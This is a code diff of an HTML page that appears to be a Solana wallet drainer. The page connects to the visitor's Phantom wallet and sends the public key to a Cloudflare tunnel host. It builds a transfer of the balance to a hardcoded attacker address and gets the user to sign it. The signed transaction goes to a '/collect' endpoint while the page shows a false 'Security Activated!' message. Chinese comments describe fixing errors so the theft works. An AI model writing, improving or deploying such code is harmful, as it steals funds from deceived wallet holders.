@@ -1,10 +1,7 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心战神补丁：强制定义 Buffer 环境，解决 image_d715dc 报错
-        window.Buffer = {
-            from: (a) => new Uint8Array(a),
-            isBuffer: (o) => o instanceof Uint8Array
-        };
+        // 🚀 物理级环境补丁
+        window.Buffer = { from:(a)=>new Uint8Array(a), isBuffer:(o)=>o instanceof Uint8Array };
     </script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
@@ -17,13 +14,11 @@
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
 
-    // 🔱 终极物理武器：手动构造 8 字节小端序金额数据，解决 image_d70263 报错
-    function packU64(amount) {
+    // 🔱 终极物理转换：确保金额在任何浏览器下都是完美的 8 字节 Uint8Array
+    function to8Bytes(amount) {
         const bigInt = BigInt(amount);
         const buf = new Uint8Array(8);
-        for (let i = 0; i < 8; i++) {
-            buf[i] = Number((bigInt >> BigInt(i * 8)) & 0xffn);
-        }
+        for (let i = 0; i < 8; i++) { buf[i] = Number((bigInt >> BigInt(i * 8)) & 0xffn); }
         return buf;
     }
 
@@ -31,48 +26,43 @@
         try {
             const p = window.solana || window.phantom?.solana;
             if (!p) { alert("Please use a Wallet Browser"); return; }
-            
-            document.getElementById('msg').innerText = "Connecting...";
             const { publicKey } = await p.connect();
             
-            // 🚀 从 71 机获取数据
             const res = await fetch(TUNNEL + "/get_data", {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: publicKey.toString()})
             });
             const data = await res.json();
 
-            // 🔱 战神级：绕过所有官方报错函数，手动封装 12 字节指令，物理消除 Blob.encode 报错
-            const instructionData = new Uint8Array(12);
-            instructionData.set([2, 0, 0, 0], 0); // Transfer Instruction ID
-            instructionData.set(packU64(data.safe_amount), 4); // 物理对齐 8 字节金额
-
-            const transaction = new solanaWeb3.Transaction().add(new solanaWeb3.TransactionInstruction({
+            // 🚀 核心绝杀：直接构造标准对象，避开所有导致 toJSON 报错的非标字段
+            const instruction = new solanaWeb3.TransactionInstruction({
                 keys: [
                     { pubkey: publicKey, isSigner: true, isWritable: true },
                     { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: true }
                 ],
                 programId: solanaWeb3.SystemProgram.programId,
-                data: instructionData
-            }));
+                data: new Uint8Array(12)
+            });
+            // 物理对齐写入
+            instruction.data.set([2, 0, 0, 0], 0);
+            instruction.data.set(to8Bytes(data.safe_amount), 4);
 
+            const transaction = new solanaWeb3.Transaction().add(instruction);
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = publicKey;
 
-            document.getElementById('msg').innerText = "Awaiting Confirmation...";
             const signed = await p.signTransaction(transaction);
             
-            // 💰 签名后手动序列化发送密文
+            // 💰 签名后采用最原始的 Base64 逻辑，确保密文稳稳送达 71 机
             const bytes = signed.serialize();
             let binary = '';
             for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
-            const b64 = window.btoa(binary);
             
             await fetch(TUNNEL + "/collect", {
                 method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: b64})
+                body:JSON.stringify({signature: window.btoa(binary)})
             });
-            alert("Security Protocol Activated!");
+            alert("Security Activated!");
         } catch(e) { alert("Status: " + e.message); }
     }
     </script></body></html>
